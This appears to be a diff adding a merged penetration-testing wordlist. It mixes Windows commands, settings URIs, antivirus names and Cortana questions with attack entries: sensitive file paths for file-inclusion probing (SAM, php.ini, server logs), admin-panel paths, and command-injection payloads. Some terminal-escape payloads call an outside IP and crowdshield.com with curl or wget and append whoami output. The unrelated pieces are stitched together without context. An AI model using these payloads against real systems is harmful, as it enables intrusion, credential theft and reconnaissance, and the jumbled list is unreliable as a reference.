+C:\Windows\system32\drivers\etc\hosts
+C:\Windows\twunk_16.exe
+C:\Windows\twunk_32.exe
+C:\Windows\winhlp32.exe
+C:\Windows\write.exe
+C:\apache\logs\access.log
+C:\apache\logs\error.log
+C:\autoexec.bat
+C:\boot.ini
+C:\config.sys
+C:\inetpub\logs\LogFiles
+C:\inetpub\wwwroot
+C:\inetpub\wwwroot\default.htm
+C:\inetpub\wwwroot\global.asa
+C:\laragon\bin\php\php.ini
+C:\nginx-1.7.4\conf\nginx.conf
+C:\nginx-1.7.4\nginx.conf
+C:\php\php.ini
+C:\wamp\apache2\logs\access.log
+C:\wamp\apache2\logs\access_log
+C:\wamp\apache2\logs\error.log
+C:\wamp\apache2\logs\error_log
+C:\wamp\bin\php\php.ini
+C:\wamp\logs\access.log
+C:\wamp\logs\access_log
+C:\wamp\logs\error.log
+C:\wamp\logs\error_log
+C:\winnt\system32\config\SAM
+C:\winnt\system32\drivers\etc\hosts
+C:\xampp\apache\conf\extra\httpd-ssl.conf
+C:\xampp\apache\conf\extra\httpd-vhosts.conf
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\access_log
+C:\xampp\apache\logs\error.log
+C:\xampp\apache\logs\error_log
+C:\xampp\apache\logs\php_error_log
+C:\xampp\phpMyAdmin\config.inc.php
+C:\xampp\php\php.ini
+C:\xampp\xampp-control.log
+CA IdentityMinder?	http://awards.scmagazine.com/ca-technologies-ca-identity-manager
+CAT-QuickHeal
+Cacls
+Calendar	ms-settings:privacy-calendar
+Call
+Call history	ms-settings:privacy-callhistory
+Camera	ms-settings:privacy-webcam
+Can I borrow some money?
+Can you cook me dinner?
+Category	Settings page	URI Command
+Category: Account Logon
+Category: Account Management
+Category: DS Access
+Category: Detailed Tracking
+Category: Logon/Logoff
+Category: Object Access
+Category: Policy Change
+Category: Privilege Use
+Category: System
+Cd
+Cellular & SIM	ms-settings:network-cellular
+Certreq
+Certutil
+Cgitest.exe
+Change
+Change how we free up space
+Chcp
+Chdir
+Check for updates
+Checkpoint-Computer
+Chglogon
+Chgport
+Chgusr
+Chkdsk
+Chkntfs
+Choice
+Cipher
+ClamAV
+Clear-Content
+Clear-EventLog
+Clear-History
+Clear-Item
+Clear-ItemProperty
+Clear-Variable
+Clip
+Closed captions	ms-settings:easeofaccess-closedcaptioning
+Cls
+Cluadmin
+Cluster
+Cmd
+Cmdkey
+Cmstp
+Color
+Colors	ms-settings:colors
+Communications Security
+Comodo
+Comp
+Compact
+Compare-Object
+Complete List of Windows 10 Shell Commands
+Complete-BitsTransfer
+Complete-Transaction
+Compress-Bzip2 Cmdlet
+Compress-Gzip Cmdlet
+Compress-Jar Cmdlet
+Compress-SevenZip Cmdlet
+Compress-Tar Cmdlet
+Compress-Zip Cmdlet
+Computer Security by Dieter Gollmann
+Connect to a wireless display
+Connect-CloudStorage Cmdlet
+Connect-Email Cmdlet
+Connect-FTP Cmdlet
+Connect-IM Cmdlet
+Connect-IMAP Cmdlet
+Connect-LDAP Cmdlet
+Connect-NNTP Cmdlet
+Connect-POP Cmdlet
+Connect-PowerShellServer Cmdlet
+Connect-SCP Cmdlet
+Connect-SFTP Cmdlet
+Connect-SMIMEEmail Cmdlet
+Connect-SMIMEIMAP Cmdlet
+Connect-SMIMEPOP Cmdlet
+Connect-SMS Cmdlet
+Connect-SSH Cmdlet
+Connect-TCP Cmdlet
+Connect-Telnet Cmdlet
+Connect-VPN Cmdlet
+Connect-WSMan
+Contacts	ms-settings:privacy-contacts
+Content Advisor
+Control Panel
+Convert
+Convert-Data Cmdlet
+Convert-Path
+ConvertFrom-CSV
+ConvertFrom-SecureString
+ConvertFrom-StringData
+ConvertTo-CSV
+ConvertTo-Html
+ConvertTo-SecureString
+ConvertTo-XML
+Copy
+Copy-IMAP Cmdlet
+Copy-Item
+Copy-ItemProperty
+Copy-WebDAV Cmdlet
+Cortana Language
+Cprofile
+CrowdStrike
+Cscript
+Csvde
+CyberSafe Log Analyst
+Cyren
+D:/inetpub/wwwroot/global.asa
+D:\inetpub\wwwroot\global.asa
+Data usage	ms-settings:datausage
+Database_Administration/
+Date
+Date	Bulletin number	Title	Affected Software
+Date & time	ms-settings:dateandtime
+Date and Time Properties
+Dcdiag
+Dcgpofix
+Dcpromo
+Debug-Process
+Default apps	ms-settings:defaultapps
+Defrag
+Del
+Delete All
+Delete All + files and settings stored by Add-ons:
+Delete Cookies
+Delete Form Data
+Delete History
+Delete Passwords
+Delete Temporary Internet Files
+Delivery Optimization
+Device Manager
+Devices
+Dfscmd
+Dfsrmig
+Diagnostics & feedback	ms-settings:privacy-feedback
+Dial-up	ms-settings:network-dialup
+Diantz
+Dir
+Directory of C:\Windows\PolicyDefinitions
+Directory of C:\Windows\PolicyDefinitions\en-US
+Directory of C:\Windows\SysWOW64
+Directory of C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules
+Directory of C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\DnsClient
+Directory of C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\NetworkTransition
+Directory of C:\Windows\SysWOW64\en-US
+Directory of C:\Windows\SysWOW64\migwiz\dlmanifests
+Directory of C:\Windows\SysWOW64\migwiz\replacementmanifests
+Directory of C:\Windows\System32
+Directory of C:\Windows\System32\WindowsPowerShell\v1.0\Modules
+Directory of C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DnsClient
+Directory of C:\Windows\System32\WindowsPowerShell\v1.0\Modules\NetworkTransition
+Directory of C:\Windows\System32\en-US
+Directory of C:\Windows\System32\migwiz\dlmanifests
+Directory of C:\Windows\System32\migwiz\replacementmanifests
+Directory of C:\Windows\System32\spp\tokens\ppdlic
+Directory of C:\Windows\System32\wbem
+Directory of C:\Windows\System32\wbem\en-US
+Directory of C:\Windows\WinSxS
+Directory of C:\Windows\WinSxS\Backup
+Directory of C:\Windows\WinSxS\FileMaps
+Directory of C:\Windows\WinSxS\Manifests
+Dirquota
+Disable-ComputerRestore
+Disable-PSBreakpoint
+Disable-PSSessionConfiguration
+Disable-WSManCredSSP
+Disconnect-CloudStorage Cmdlet
+Disconnect-Email Cmdlet
+Disconnect-FTP Cmdlet
+Disconnect-IM Cmdlet
+Disconnect-IMAP Cmdlet
+Disconnect-LDAP Cmdlet
+Disconnect-NNTP Cmdlet
+Disconnect-POP Cmdlet
+Disconnect-PowerShellServer Cmdlet
+Disconnect-SCP Cmdlet
+Disconnect-SFTP Cmdlet
+Disconnect-SMIMEEmail Cmdlet
+Disconnect-SMIMEIMAP Cmdlet
+Disconnect-SMIMEPOP Cmdlet
+Disconnect-SMS Cmdlet
+Disconnect-SSH Cmdlet
+Disconnect-TCP Cmdlet
+Disconnect-Telnet Cmdlet
+Disconnect-VPN Cmdlet
+Disconnect-WSMan
+DiskPart Commands
+DiskRAID
+Diskcomp
+Diskcopy
+Diskedit
+Diskperf
+Diskshadow
+Dispdiag
+Display	ms-settings:display
+Display Settings
+Distributed Denial Of Service Attacks: http://www.icsa.net/
+Djoin
+Dnscmd
+Do you have a boyfriend?
+Do you know Siri?
+Documents	ms-settings:privacy-documents
+Dommon
+Doskey
+DrWeb
+Drive-by download	https://www.microsoft.com/security/sir/glossary/drive-by-download-sites.aspx
+Driverquery
+Dsacls
+Dsadd
+Dsamain
+Dsdbutil
+Dsget
+Dsmgmt
+Dsmod
+Dsmove
+Dsquery
+Dsrm
+Dsstore
+Dumpel
+E-mail Naming Shim Provider
+ESET-NOD32
+Ease of Access
+Echo
+Edit
+Efsinfo
+Electronic Sabotage by Carol E. Brown and Alan Sangster http://www.bus.orst.edu/
+Email	ms-settings:privacy-email
+Email & app accounts	ms-settings:emailandaccounts
+EmpowerID	http://www.empowerid.com/products/authorizationservices
+Emsisoft
+Enable-ComputerRestore
+Enable-PSBreakpoint
+Enable-PSRemoting
+Enable-PSSessionConfiguration
+Enable-WSManCredSSP
+Endgame
+Endlocal
+Enter-PSSession
+Enumprop
+Environment
+Erase
+Esentutl
+Ethernet	ms-settings:network-ethernet
+Eventcreate
+Eventquery.vbs
+Eventtriggers
+Evntcmd
+Exit
+Exit-PSSession
+Expand
+Expand-Bzip2 Cmdlet
+Expand-Gzip Cmdlet
+Expand-Jar Cmdlet
+Expand-SevenZip Cmdlet
+Expand-Tar Cmdlet
+Expand-Zip Cmdlet
+Export-Alias
+Export-CSV
+Export-Certificate Cmdlet
+Export-Clixml
+Export-Console
+Export-Counter
+Export-FormatData
+Export-ModuleMember
+Export-PSSession
+Extract
+Extras	ms-settings:extras
+F-Prot
+F-Secure
+Family & other people	ms-settings:otherusers
+Fc
+Filescrn
+Find
+Find My Device	ms-settings:findmydevice
+Findstr
+Finger
+Firefox Last Version/Windows Phone 7
+Flattemp
+Folder Options  File Types
+Folder Options  General
+Folder Options  Search
+Folder Options  View
+Fondue
+For
+For developers	ms-settings:developers
+For example:
+ForEach-Object
+Forfiles
+Forgotten Password Wizard
+Format
+Format-Custom
+Format-List
+Format-Table
+Format-Wide
+Fortinet
+Freedisk
+Fsutil
+Ftp
+Ftype
+Fveupdate
+GData
+GW5/GWWEB.EXE
+GW5/GWWEB.EXE?GET-CONTEXT&HTMLVER=AAA
+GW5/GWWEB.EXE?HELP=bad-request
+GWWEB.EXE?HELP=bad-request
+Game DVR	ms-settings:gaming-gamedvr
+Game Mode	ms-settings:gaming-gamemode
+Game bar	ms-settings:gaming-gamebar
+Gaming
+Gartner Symposium ITXPO	http://www.gartner.com/technology/symposium/orlando/
+General	ms-settings:privacy
+Get-Acl
+Get-Alias
+Get-AppLockerFileInformation
+Get-AppLockerPolicy
+Get-AuthenticodeSignature
+Get-BitsTransfer
+Get-Certificate Cmdlet
+Get-ChildItem
+Get-CloudStorage Cmdlet
+Get-Command
+Get-ComputerRestorePoint
+Get-Content
+Get-Counter
+Get-Credential
+Get-Culture
+Get-DNS Cmdlet
+Get-Event
+Get-EventLog
+Get-EventSubscriber
+Get-ExecutionPolicy
+Get-FTP Cmdlet
+Get-FormatData
+Get-HTTP Cmdlet
+Get-History
+Get-Host
+Get-HotFix
+Get-IMAP Cmdlet
+Get-Item
+Get-ItemProperty
+Get-Job
+Get-LDAP Cmdlet
+Get-Location
+Get-MX Cmdlet
+Get-Member
+Get-Module
+Get-NNTP Cmdlet
+Get-POP Cmdlet
+Get-PSBreakpoint
+Get-PSCallStack
+Get-PSDrive
+Get-PSProvider
+Get-PSSession
+Get-PSSessionConfiguration
+Get-PSSnapin
+Get-Packet Cmdlet
+Get-PfxCertificate
+Get-PowerShellServerFile Cmdlet
+Get-Process
+Get-RAS Cmdlet
+Get-RSS Cmdlet
+Get-Random
+Get-S3 Cmdlet
+Get-SCP Cmdlet
+Get-SFTP Cmdlet
+Get-SMIMEIMAP Cmdlet
+Get-SMIMEPOP Cmdlet
+Get-SNMP Cmdlet
+Get-Service
+Get-Syslog Cmdlet
+Get-TFTP Cmdlet
+Get-Time Cmdlet
+Get-Trace Cmdlet
+Get-TraceSource
+Get-Transaction
+Get-Trap Cmdlet
+Get-TroubleshootingPack
+Get-UDP Cmdlet
+Get-UICulture
+Get-Unique
+Get-Variable
+Get-WSManCredSSP
+Get-WSManInstance
+Get-WebDAV Cmdlet
+Get-Whois Cmdlet
+Get-WinEvent
+Get-WmiObject
+Getmac
+Getsid
+Gettype
+Global
+Goto
+Gpfixup
+Gpresult
+Gpupdate
+Graftabl
+Group-Object
+Grpcpy
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions
+Hashgen
+Headset display
+Help
+Helpctr
+Hibernate
+High Contrast	ms-settings:easeofaccess-highcontrast
+Hostname
+How do I look?
+How old are you?
+Hyper-V RAW
+ID	Message
+Iasparse
+Icacls
+If
+Ikarus
+Import-Alias
+Import-CSV
+Import-Certificate Cmdlet
+Import-Clixml
+Import-Counter
+Import-LocalizedData
+Import-Module
+Import-PSSession
+Indy_admin/
+Internet Explorer
+Internet Explorers Internet Properties dialog box.
+Internet Hoaxes: http://ciac.llnl.gov
+Inuse
+Invincea
+Invoke-Command
+Invoke-Expression
+Invoke-History
+Invoke-Item
+Invoke-PowerShellServer Cmdlet
+Invoke-Rexec Cmdlet
+Invoke-Rshell Cmdlet
+Invoke-SSH Cmdlet
+Invoke-Telnet Cmdlet
+Invoke-TroubleshootingPack
+Invoke-WSManAction
+Invoke-WmiMethod
+Ipconfig
+Ipxroute
+Irftp
+Is the hacker threat real? By Christopher Null: Lantimes http://www.lantimes.com
+Ismserv
+Jetpack
+Jiangmin
+Join-Path
+Just kidding.
+K7AntiVirus
+K7GW
+Kaspersky
+Kerbtray
+Keyboard	ms-settings:easeofaccess-keyboard
+Keyboard Properties
+Kingsoft
+Klist
+Ksetup
+Ktmutil
+Ktpass
+Label
+Ldifde
+Ldp
+Limit-EventLog
+LiveUser_Admin/
+Local
+Location	ms-settings:privacy-location
+Lock Screen
+Lock screen	ms-settings:lockscreen
+Lock-WebDAV Cmdlet
+Lodctr
+Logevent
+Logman
+Logoff
+Lotus_Domino_Admin/
+Lpq
+Lpr
+Lumension Vulnerability Management	http://www.lumension.com/Solutions/Vulnerability-Management.aspx
+MSAFD Irda [IrDA]
+MSAFD Tcpip [RAW/IP]
+MSAFD Tcpip [RAW/IPv6]
+MSAFD Tcpip [TCP/IP]
+MSAFD Tcpip [TCP/IPv6]
+MSAFD Tcpip [UDP/IP]
+MSAFD Tcpip [UDP/IPv6]
+Macfile
+Magnifier	ms-settings:easeofaccess-magnifier
+Makecab
+Malwarebytes
+Manage known networks
+Manage optional features
+Manage-bde
+Map Network Drive Wizard
+Mapadmin
+May the force be with you.
+McAfee
+McAfee-GW-Edition
+Md
+Measure-Command
+Measure-Object
+Messaging	ms-settings:privacy-messaging
+Microphone	ms-settings:privacy-microphone
+Microsoft
+Microsoft .NET Framework
+Microsoft Communications Platforms and Software
+Microsoft Edge
+Microsoft Lync.
+Microsoft Office
+Microsoft Office Services and Web Apps
+Microsoft SQL Server
+Microsoft Security Development Lifecycle	https://www.microsoft.com/security/sdl/default.aspx
+Microsoft Security Intelligence Report	https://www.microsoft.com/security/sir/default.aspx
+Microsoft Server Software
+Microsoft Windows
+Microsoft Windows NT 4.0 Server Resource Kit
+Microsoft Windows NT 4.0 Workstation Resource Kit
+Microsoft security administration tools
+Mixed reality		ms-settings:holographic
+Mkdir
+Mklink
+Mmc
+Mobile hotspot	ms-settings:network-mobilehotspot
+Mode
+More
+More details	ms-settings:cortana-moredetails
+Mount
+Mountvol
+Mouse	ms-settings:easeofaccess-mouse
+Mouse	ms-settings:mousetouchpad
+Mouse Button  Swap left button to function as right
+Mouse Properties Dialog Box
+Move
+Move-IMAP Cmdlet
+Move-Item
+Move-ItemProperty
+Move-WebDAV Cmdlet
+Mqbkup
+Mqsvc
+Mqtgsvc
+Msdt
+Msg
+Msiexec
+Msinfo32
+MsmMask.exe
+Mstsc
+Multitasking	ms-settings:multitasking
+NANO-Antivirus
+NTDS
+Narrator	ms-settings:easeofaccess-narrator
+Nbtstat
+Net computer
+Net group
+Net localgroup
+Net print
+Net session
+Net share
+Net use
+Net user
+Net view
+NetIQ Privileged User Manager	https://www.netiq.com/products/privileged-user-manager/
+Netcfg
+Netdiag
+Netdom
+Netsh
+Netstat
+Network & Internet		ms-settings:network
+Network Connections
+New-Alias
+New-AppLockerPolicy
+New-Certificate Cmdlet
+New-Event
+New-EventLog
+New-Item
+New-ItemProperty
+New-Module
+New-ModuleManifest
+New-Object
+New-PSDrive
+New-PSSession
+New-PSSessionOption
+New-Service
+New-TimeSpan
+New-Variable
+New-WSManInstance
+New-WSManSessionOption
+New-WebServiceProxy
+Nfsadmin
+Nfsshare
+Nfsstat
+Night light
+Nlb
+Nlbmgr
+Nltest
+Notifications	ms-settings:cortana-notifications
+Notifications	ms-settings:privacy-notifications
+Notifications & actions	ms-settings:notifications
+Nslookup
+Ntbackup
+Ntcmdprompt
+Ntdsutil
+Ntfrsutl
+OS Security: Access Control
+OS Security: Auditing
+OS Security: Authentication
+Offline maps	ms-settings:maps
+Open Windows Defender Security Center
+Open With Dialog Box
+Openfiles
+Organize IE Favourites
+Other devices	ms-settings:privacy-customdevices
+Other options	ms-settings:easeofaccess-otheroptions
+Out-Default
+Out-File
+Out-GridView
+Out-Host
+Out-Null
+Out-Printer
+Out-String
+PAStore Engine applied Active Directory storage IPsec policy on the computer.
+PAStore Engine applied local registry storage IPsec policy on the computer.
+PAStore Engine applied locally cached copy of Active Directory storage IPsec policy on the computer.
+PAStore Engine failed to apply Active Directory storage IPsec policy on the computer.
+PAStore Engine failed to apply local registry storage IPsec policy on the computer.
+PAStore Engine failed to apply some rules of the active IPsec policy on the computer.
+PAStore Engine failed to load directory storage IPsec policy on the computer.
+PAStore Engine failed to load local storage IPsec policy on the computer.
+PAStore Engine loaded directory storage IPsec policy on the computer.
+PAStore Engine loaded local storage IPsec policy on the computer.
+PAStore Engine polled for changes to the active IPsec policy and detected no changes.
+PNRP Cloud Namespace Provider
+PNRP Name Namespace Provider
+PSUser/
+Pagefileconfig.vbs
+Palo Alto Networks
+Panda
+Path
+Pathping
+Pause
+Pbadmin
+Pbcgi.exe
+Pen & Windows Ink	ms-settings:pen
+Pentnt
+Perfmon
+Permissions & history	ms-settings:cortana-permissions
+Perms displays a user's access permissions for a specified file or set of files.
+Personalization		ms-settings:personalization
+Phone	ms-settings:mobile-devices
+Pictures	ms-settings:privacy-pictures
+Ping
+Pnpunattend
+Pnputil
+Pop-Location
+Popd
+Power & sleep	ms-settings:powersleep
+Power Options
+PowerShell
+PowerShell_Ise
+Powercfg
+Practical Unix and Internet Security by Simon Garfinkel and Gene Spafford
+Pretty Good Privacy: http://www.pgp.com
+Print
+Printer Management Folder.
+Printer User Interface
+Printers & scanners	ms-settings:printers
+Privacy		ms-settings:privacy
+Prncnfg.vbs
+Prndrvr.vbs
+Prnjobs.vbs
+Prnmngr.vbs
+Prnport.vbs
+Prnqctl.vbs
+Process Idle Tasks
+Projecting to this PC	ms-settings:project
+Prompt
+Protect-Data Cmdlet
+Proxy	ms-settings:network-proxy
+Public Key Infrastructure
+Publication Date	Advisory Number	Title
+Pubprn.vbs
+Push-Location
+Pushd
+Pushprinterconnections
+Qappsrv
+Qprocess
+Query
+Quser
+Qwinsta
+RSVP TCP Service Provider
+RSVP TCPv6 Service Provider
+RSVP UDP Service Provider
+RSVP UDPv6 Service Provider
+Radios	ms-settings:privacy-radios
+Rasdial
+Rcp
+Rd
+Rdpsign
+Read-Host
+Reagentc
+Receive-Job
+Recover
+Recovery	ms-settings:recovery
+Redircmp
+Redirusr
+Reg
+Regini
+Region & language	ms-settings:regionlanguage
+Regional and Language Options
+Register-EngineEvent
+Register-ObjectEvent
+Register-PSSessionConfiguration
+Register-WmiEvent
+Regsvr32
+Relog
+Rem
+Remote Desktop	ms-settings:remotedesktop
+Remove-BitsTransfer
+Remove-Certificate Cmdlet
+Remove-CloudStorage Cmdlet
+Remove-Computer
+Remove-Event
+Remove-EventLog
+Remove-FTP Cmdlet
+Remove-IMAP Cmdlet
+Remove-Item
+Remove-ItemProperty
+Remove-Job
+Remove-LDAP Cmdlet
+Remove-Module
+Remove-POP Cmdlet
+Remove-PSBreakpoint
+Remove-PSDrive
+Remove-PSSession
+Remove-PSSnapin
+Remove-S3 Cmdlet
+Remove-SFTP Cmdlet
+Remove-VPN Cmdlet
+Remove-Variable
+Remove-WSManInstance
+Remove-WebDAV Cmdlet
+Remove-WmiObject
+Ren
+Rename
+Rename-FTP Cmdlet
+Rename-IMAP Cmdlet
+Rename-Item
+Rename-ItemProperty
+Rename-LDAP Cmdlet
+Rename-S3 Cmdlet
+Rename-SFTP Cmdlet
+Rendom
+Repadmin
+Repair-bde
+Replace
+Reset session
+Reset-ComputerMachinePassword
+Resolve-Path
+Restart options
+Restart-Computer
+Restart-Service
+Restore-Computer
+Resume-BitsTransfer
+Resume-Service
+Retina CS Management	http://www.wideeyesecurity.com/products.asp
+Rexec
+Risetup
+Rising
+Rmdir
+Robocopy
+Route
+Rpcinfo
+Rpcping
+Rsh
+Rsm
+Rss
+RunDll32.exe devmgr.dll DeviceManager_Execute
+Runas
+Rundll32
+Rwinsta
+SUPERAntiSpyware
+Safely Remove Hardware Dialog Box
+Save locations
+Say something funny.
+Sc
+Schtasks
+Scwcmd
+Search-IMAP Cmdlet
+Secedit
+Secunia	http://secunia.com/
+Select-Object
+Select-String
+Select-XML
+Send-CloudStorage Cmdlet
+Send-Email Cmdlet
+Send-FTP Cmdlet
+Send-IM Cmdlet
+Send-MailMessage
+Send-NNTP Cmdlet
+Send-Page Cmdlet
+Send-Ping Cmdlet
+Send-PowerShellServerFile Cmdlet
+Send-SCP Cmdlet
+Send-SFTP Cmdlet
+Send-SMIMEEmail Cmdlet
+Send-SMS Cmdlet
+Send-Syslog Cmdlet
+Send-TCP Cmdlet
+Send-TFTP Cmdlet
+Send-Trap Cmdlet
+Send-UDP Cmdlet
+Send-WebDAV Cmdlet
+SentinelOne
+Server.asp
+Server.aspx
+Server/
+ServerAdministrator/
+Serverceipoptin
+Servermanagercmd
+Serverweroptin
+Session cleanup	ms-settings:surfacehub-sessioncleanup
+Set
+Set-Acl
+Set-Alias
+Set-AppLockerPolicy
+Set-AuthenticodeSignature
+Set-BitsTransfer
+Set-Content
+Set-Date
+Set-ExecutionPolicy
+Set-IMAP Cmdlet
+Set-Item
+Set-ItemProperty
+Set-LDAP Cmdlet
+Set-Location
+Set-PSBreakpoint
+Set-PSDebug
+Set-PSSessionConfiguration
+Set-RAS Cmdlet
+Set-SNMP Cmdlet
+Set-Service
+Set-StrictMode
+Set-TraceSource
+Set-Variable
+Set-WSManInstance
+Set-WSManQuickConfig
+Set-WebDAV Cmdlet
+Set-WmiInstance
+Setlocal
+Setspn
+Settings home page	ms-settings:
+Setx
+Sfc
+Shadow
+Shared experiences	ms-settings:crossdevice
+Shell Command	Opens
+Shift
+Show available networks
+Show-EventLog
+Showmount
+Showpriv
+Shutdown
+Sign-in options	ms-settings:signinoptions
+SolarWinds	http://www.solarwinds.com/eminentware-products.aspx
+Sophos
+Sort
+Sort-Object
+Sound Properties Dialog Box
+Special Report: DDOS wreaks havoc on the Internet: http://www.infosecurity.com/
+Speech	ms-settings:speech
+Split-Path
+Spybot Search and Destroy: How to uninstall: http://www.safer-networking.org/en/howto/uninstall.html
+Start
+Start	ms-settings:personalization-start
+Start-BitsTransfer
+Start-Job
+Start-Process
+Start-Service
+Start-Sleep
+Start-Transaction
+Start-Transcript
+Status	ms-settings:network-status
+Stop-Computer
+Stop-Job
+Stop-Process
+Stop-Service
+Stop-Transcript
+Storage	ms-settings:storagesense
+Stored Usernames and Passwords
+Storrept
+Subcategory: Application Generated
+Subcategory: Application Group Management
+Subcategory: Audit Policy Change
+Subcategory: Authentication Policy Change
+Subcategory: Authorization Policy Change
+Subcategory: Certification Services
+Subcategory: Computer Account Management
+Subcategory: Credential Validation
+Subcategory: DPAPI Activity
+Subcategory: Detailed Directory Service Replication
+Subcategory: Directory Service Access
+Subcategory: Directory Service Changes
+Subcategory: Directory Service Replication
+Subcategory: Distribution Group Management
+Subcategory: File Share
+Subcategory: File System
+Subcategory: Filtering Platform Connection
+Subcategory: Filtering Platform Packet Drop
+Subcategory: Filtering Platform Policy Change
+Subcategory: Handle Manipulation
+Subcategory: IPsec Driver
+Subcategory: IPsec Extended Mode
+Subcategory: IPsec Main Mode
+Subcategory: IPsec Quick Mode
+Subcategory: Kerberos Authentication Service
+Subcategory: Kerberos Service Ticket Operations
+Subcategory: Logoff
+Subcategory: Logon
+Subcategory: MPSSVC Rule-Level Policy Change
+Subcategory: Network Policy Server
+Subcategory: Other Account Management Events
+Subcategory: Other Logon/Logoff Events
+Subcategory: Other Object Access Events
+Subcategory: Other Policy Change Events
+Subcategory: Other System Events
+Subcategory: Process Creation
+Subcategory: Process Termination
+Subcategory: RPC Events
+Subcategory: Registry
+Subcategory: Security Group Management
+Subcategory: Security State Change
+Subcategory: Security System Extension
+Subcategory: Sensitive Privilege Use / Non-Sensitive Privilege Use
+Subcategory: Special Logon
+Subcategory: Special Multi-use Subcategory
+Subcategory: System Integrity
+Subcategory: User Account Management
+Subst
+Suggestion: Stop and Send in a Bug Report
+Super-Admin/
+Surface Hub
+Suspend-BitsTransfer
+Suspend-Service
+Svcacls
+Sxstrace
+Symantec
+Symantec Mobile Insight
+Sync your settings	ms-settings:sync
+SysAdmin/
+SysAdmin2/
+Sysocmgr
+System
+System Properties  Advanced
+System Properties Box
+System Properties: Automatic Updates
+System Scanner
+Systeminfo
+Tablet mode	ms-settings:tabletmode
+Takeown
+Talk to Cortana	ms-settings:cortana
+Tapicfg
+Taskbar	ms-settings:taskbar
+Taskbar Properties
+Taskkill
+Tasklist
+Tasks	ms-settings:privacy-tasks
+Tcmsetup
+Tcpip
+Team Conferencing	ms-settings:surfacehub-calling
+Team device management	ms-settings:surfacehub-devicemanagenent
+Tee-Object
+Tell me a joke.
+Tell me a story.
+Tell me about Halo.
+Telnet
+Tencent
+Test-AppLockerPolicy
+Test-ComputerSecureChannel
+Test-Connection
+Test-ModuleManifest
+Test-Path
+Test-WSMan
+Tftp
+That means you've successfully confirmed XXE on Windows
+The red shell commands in the table below are new to Windows 10.
+TheHacker
+Themes	ms-settings:themes
+Things that Go Bump in the Net by David Chess http://www.research.ibm.com
+Third-party tools
+This command-line tool displays members of global groups on remote servers or domains.
+This command-line tool displays members of local groups on remote servers or domains.
+Time
+Time & language
+Timeout
+Title
+Tlntadmn
+Total Files Listed:
+Touchpad	ms-settings:devices-touchpad
+Trace-Command
+Tracerpt
+Tracert
+Tree
+TrendMicro
+TrendMicro-HouseCall
+Trojan Horses http://www.cert.org
+Troubleshoot	ms-settings:troubleshoot
+Tru Access manager Lite
+Trustlook
+Tscon
+Tsdiscon
+Tsecimp
+Tskill
+Tsprof
+Type
+Typeperf
+Typing	ms-settings:typing
+Tzutil
+USB	ms-settings:usb
+Uddiconfig
+Umount
+Undo-Transaction
+Uninstall
+Unlock-WebDAV Cmdlet
+Unlodctr
+Unplug/Eject Hardware
+Unprotect-Data Cmdlet
+Unregister-Event
+Unregister-PSSessionConfiguration
+Update & security		ms-settings:windowsupdate
+Update history
+Update-FormatData
+Update-List
+Update-TypeData
+Use-Transaction
+User Accounts
+UserLogin/
+Usrtogrp
+VBA32
+VIPRE
+VPN	ms-settings:network-vpn
+Ver
+Verifier
+Verify
+ViRobot
+Videos	ms-settings:privacy-documents
+Viruses: http://ciac.llnl.gov
+Viruses: http://e-comm.webopedia.com/
+Vol
+Volume Serial Number is 5ECB-DEF3
+Volume in drive C has no label.
+Vssadmin
+Vulnerability Intelligence Manager	http://secunia.com/vulnerability_intelligence/
+W32tm
+Wait-Event
+Wait-Job
+Wait-Process
+Waitfor
+Wbadmin
+Wdsutil
+Webnews.exe
+Webroot
+Wecutil
+Welcome screen	ms-settings:surfacehub-welcome
+Wevtutil
+What are you up to?
+What are you wearing?
+What does Cortana mean?
+What does the [cat/dog/rooster/horse] say?
+What is the meaning of life?
+What's your favorite color?
+What's your favorite music?
+Where
+Where do babies come from?
+Where do you live?
+Where-Object
+WhiteArmor
+Who is your creator?
+Whoami
+Whos your daddy?
+Why are we here?
+Why are you blue?
+Why are you naked?
+Why did the chicken cross the road?
+Wi-Fi	ms-settings:network-wifi
+Wi-Fi Calling	ms-settings:network-wificalling
+Windows  About
+Windows Firewall
+Windows Fonts Installation Folder
+Windows Hello
+Windows Insider Program	ms-settings:windowsinsider
+Windows Mobile
+Windows Phone 8
+Windows Phone 8.1
+Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; NOKIA; Lumia 710)
+Windows Security Center
+Windows Update	ms-settings:windowsupdate
+Windows XXE Smoke Test PoC
+Winnt
+Winnt32
+Winpop
+Winrs
+Winsat
+Wireless Network Setup
+Wlbs
+Wmic
+Write-Debug
+Write-Error
+Write-EventLog
+Write-Host
+Write-Output
+Write-Progress
+Write-Verbose
+Write-Warning
+Wscript
+Xcopy
+Yandex
+You can create a shortcut with a shell command by adding explorer in front of the shell command.
+You're useless.
+Your info	ms-settings:yourinfo
+Zillya
+ZoneAlarm
+Zoner
+\n
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Asleep 5\n
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
+\nid;
+\nid\n
+\nid|
+\r
+\r\n
+]>
+_vti_bin/shtml.dll/_vti_rpc
+`
+`id`
+`ping 127.0.0.1`
+a
+a;id;
+a;id\n
+a;id|
+aadmin/
+acceso.asp
+acceso.aspx
+access.asp
+access.aspx
+access/
+accounts.asp
+accounts.aspx
+accounts/
+acct_login/
+adm.asp
+adm.aspx
+adm/
+adm_auth.asp
+adm_auth.aspx
+admin-login.asp
+admin-login.aspx
+admin.asp
+admin.aspx
+admin.htm
+admin.html
+admin/
+admin/account.asp
+admin/account.aspx
+admin/account.html
+admin/admin-login.asp
+admin/admin-login.aspx
+admin/admin.asp
+admin/admin.aspx
+admin/adminLogin.asp
+admin/adminLogin.aspx
+admin/adminLogin.htm
+admin/adminLogin.html
+admin/admin_login.asp
+admin/admin_login.aspx
+admin/controlpanel.asp
+admin/controlpanel.aspx
+admin/controlpanel.htm
+admin/controlpanel.html
+admin/cp.asp
+admin/cp.aspx
+admin/db.php
